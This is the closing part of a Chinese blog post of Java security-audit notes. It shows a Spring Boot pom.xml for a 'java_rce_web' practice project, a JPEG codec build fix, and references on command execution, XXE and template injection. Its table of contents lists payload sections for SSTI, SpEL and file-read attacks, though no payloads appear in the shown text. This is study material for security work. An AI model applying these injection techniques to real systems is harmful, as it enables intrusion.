class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>java_rce_web<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>com.sun.image.codec.jpeg不存在</p>
<p>查了许多文章，都是在pom.xml中加类似下面这样的东西，实测没用</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--解决打包错 程序包com.sun.image.codec.jpeg不存在--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">verbose</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar;$&#123;java.home&#125;/lib/jce.jar<span class="tag">&lt;/<span class="name">bootclasspath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- windows下用;，linux下用: --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>真正能用的还是改代码，目前还没测试兼容性问题，但是com.sun.image.codec.jpeg这个包已经很老了。使用这句代码替换原代码实现的功能</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImageIO.write(tag,<span class="string">&quot;jpeg&quot;</span>,out);</span><br></pre></td></tr></table></figure>

<p><img src="image-20230821093918165.png" alt="image-20230821093918165"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/15225367.html">Java审计之文件上传<i class="fas fa-external-link-alt"></i></a> <a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/15225367.html">https://www.cnblogs.com/CoLo/p/15225367.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221159">Java安全之命令执行 <i class="fas fa-external-link-alt"></i></a> <a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221159">https://www.anquanke.com/post/id/221159<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/payloadbox/xxe-injection-payload-list">XML External Entity (XXE) Injection Payload List<i class="fas fa-external-link-alt"></i></a>  <a class="link" target="_blank" rel="noopener" href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://paper.seebug.org/1304/#liferay-freemarkerssti">逃逸安全的模板沙箱（一）——FreeMarker（上）<i class="fas fa-external-link-alt"></i></a><a class="link" target="_blank" rel="noopener" href="https://paper.seebug.org/1304/#liferay-freemarkerssti">https://paper.seebug.org/1304/#liferay-freemarkerssti<i class="fas fa-external-link-alt"></i></a></p>
<p>SSTI - ThymeLeaf 优秀文章</p>
<ul>
<li><a class="link" target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://moonsec.top/articles/121">https://moonsec.top/articles/121<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/colo/p/15507738.html">https://www.cnblogs.com/colo/p/15507738.html<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514<i class="fas fa-external-link-alt"></i></a></li>
</ul>

        </div>

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2023/08/15/Ubuntu-Javafx%E8%87%AA%E5%AE%9A%E4%B9%89/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Ubuntu-Javafx自定义</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2023/08/14/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%BA%AF%E6%BA%90/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">企业微信溯源</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script data-pjax
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
                    appKey: 'itjAi31G55tfhpSKJiuLDe2g',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '生命是上天的馈赠，我不想虚度年华',
                    lang: 'cn'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'This_is_Y';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('true') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ssrf"><span class="nav-number">1.</span> <span class="nav-text">ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">ssrf危险函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BA%E7%8E%B0%E5%9C%BA%E6%99%AF"><span class="nav-number">1.2.</span> <span class="nav-text">出现场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.3.</span> <span class="nav-text">关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">1.4.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B"><span class="nav-number">1.5.</span> <span class="nav-text">案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E5%86%99%E4%B8%80%E7%82%B9"><span class="nav-number">1.5.1.</span> <span class="nav-text">多写一点</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">文件上传关键函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">java 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#java-lang-Runtime"><span class="nav-number">3.1.</span> <span class="nav-text">java.lang.Runtime</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="nav-number">3.1.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-lang-ProcessBuilder"><span class="nav-number">3.2.</span> <span class="nav-text">java.lang.ProcessBuilder</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#command-%E6%96%B9%E6%B3%95"><span class="nav-number">3.2.1.</span> <span class="nav-text">command()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#start-%E6%96%B9%E6%B3%95"><span class="nav-number">3.2.2.</span> <span class="nav-text">start()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-lang-UNIXProcess-ProcessImpl"><span class="nav-number">3.3.</span> <span class="nav-text">java.lang.UNIXProcess&#x2F;ProcessImpl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#java-%E5%8F%8D%E5%B0%84"><span class="nav-number">4.</span> <span class="nav-text">java 反射</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96class%E5%AF%B9%E8%B1%A1"><span class="nav-number">4.1.</span> <span class="nav-text">获取class对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-3"><span class="nav-number">4.1.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84api"><span class="nav-number">4.2.</span> <span class="nav-text">反射api</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java-lang-Class"><span class="nav-number">4.2.1.</span> <span class="nav-text">java.lang.Class</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-4"><span class="nav-number">4.2.1.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java-lang-reflect-Field"><span class="nav-number">4.2.2.</span> <span class="nav-text">java.lang.reflect.Field</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-5"><span class="nav-number">4.2.2.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java-lang-reflect-Method"><span class="nav-number">4.2.3.</span> <span class="nav-text">java.lang.reflect.Method</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-6"><span class="nav-number">4.2.3.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java-lang-reflect-Modifier"><span class="nav-number">4.2.4.</span> <span class="nav-text">java.lang.reflect.Modifier</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-7"><span class="nav-number">4.2.4.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java-lang-reflect-Constructor"><span class="nav-number">4.2.5.</span> <span class="nav-text">java.lang.reflect.Constructor</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-8"><span class="nav-number">4.2.5.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java-lang-reflect-AccessibleObject"><span class="nav-number">4.2.6.</span> <span class="nav-text">java.lang.reflect.AccessibleObject</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-9"><span class="nav-number">4.2.6.1.</span> <span class="nav-text">示例代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java%E5%8F%8D%E5%B0%84%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.3.</span> <span class="nav-text">java反射到命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#runtime"><span class="nav-number">4.3.1.</span> <span class="nav-text">runtime</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getmethod"><span class="nav-number">4.3.1.1.</span> <span class="nav-text">getmethod</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getDeclaredConstructor"><span class="nav-number">4.3.1.2.</span> <span class="nav-text">getDeclaredConstructor</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessBuilder"><span class="nav-number">4.3.2.</span> <span class="nav-text">ProcessBuilder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessImpl"><span class="nav-number">4.3.3.</span> <span class="nav-text">ProcessImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">4.3.4.</span> <span class="nav-text">最后的完整代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">java序列化和反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.2.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI"><span class="nav-number">6.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E4%B8%AD%E7%9A%84%E4%B8%89%E4%B8%AA%E8%A7%92%E8%89%B2"><span class="nav-number">6.1.</span> <span class="nav-text">RMI中的三个角色</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%E6%AD%A5%E9%AA%A4"><span class="nav-number">6.2.</span> <span class="nav-text">RMI代码编写步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI"><span class="nav-number">7.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLI"><span class="nav-number">8.</span> <span class="nav-text">SQLI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDBC"><span class="nav-number">8.1.</span> <span class="nav-text">JDBC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java-sql-PreparedStatement"><span class="nav-number">8.1.1.</span> <span class="nav-text">java.sql.PreparedStatement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by"><span class="nav-number">8.1.2.</span> <span class="nav-text">order by</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mybatis"><span class="nav-number">8.2.</span> <span class="nav-text">mybatis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mybatis%E4%B8%AD-%E5%92%8C-%E5%8C%BA%E5%88%AB"><span class="nav-number">8.2.1.</span> <span class="nav-text">Mybatis中#{}和${}区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by-1"><span class="nav-number">8.2.2.</span> <span class="nav-text">order by</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#in"><span class="nav-number">8.2.3.</span> <span class="nav-text">in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#like"><span class="nav-number">8.2.4.</span> <span class="nav-text">like</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%8E%E6%BC%8F%E6%B4%9E-SSTI"><span class="nav-number">9.</span> <span class="nav-text">Java 模板引擎与漏洞 SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.1.</span> <span class="nav-text">模板注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Freemarker-%E6%80%BB%E4%BD%93%E7%BB%93%E6%9E%84"><span class="nav-number">9.2.</span> <span class="nav-text">Freemarker 总体结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%92%E5%80%BC"><span class="nav-number">9.3.</span> <span class="nav-text">插值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">10.</span> <span class="nav-text">Hello ${name}!</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-number">10.1.</span> <span class="nav-text">内建函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PayLoad"><span class="nav-number">10.2.</span> <span class="nav-text">PayLoad</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#new"><span class="nav-number">10.2.1.</span> <span class="nav-text">new</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#api"><span class="nav-number">10.2.2.</span> <span class="nav-text">api</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Thymeleaf"><span class="nav-number">10.3.</span> <span class="nav-text">Thymeleaf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload"><span class="nav-number">10.3.1.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Velocity"><span class="nav-number">10.4.</span> <span class="nav-text">Velocity</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#set-%E6%8C%87%E4%BB%A4%E6%94%BB%E5%87%BB%E8%AF%AD%E5%8F%A5%E7%A4%BA%E4%BE%8B"><span class="nav-number">10.4.1.</span> <span class="nav-text">set 指令攻击语句示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Velocity-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-13936"><span class="nav-number">10.4.2.</span> <span class="nav-text">Velocity 模板注入漏洞(CVE-2020-13936)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#evaluate-%E8%A7%A6%E5%8F%91"><span class="nav-number">10.4.2.1.</span> <span class="nav-text">evaluate 触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#merge-%E8%A7%A6%E5%8F%91"><span class="nav-number">10.4.2.2.</span> <span class="nav-text">merge 触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8C%BA%E5%88%AB"><span class="nav-number">10.4.2.3.</span> <span class="nav-text">区别</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SpEL"><span class="nav-number">11.</span> <span class="nav-text">SpEL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SpEL-%E7%94%A8%E6%B3%95"><span class="nav-number">11.1.</span> <span class="nav-text">SpEL 用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpEL-%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">11.2.</span> <span class="nav-text">SpEL 应用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpEL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">11.3.</span> <span class="nav-text">SpEL 注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3"><span class="nav-number">12.</span> <span class="nav-text">文件相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1"><span class="nav-number">12.1.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="nav-number">12.2.</span> <span class="nav-text">任意文件读取&#x2F;下载漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-number">12.2.1.</span> <span class="nav-text">windows系统敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 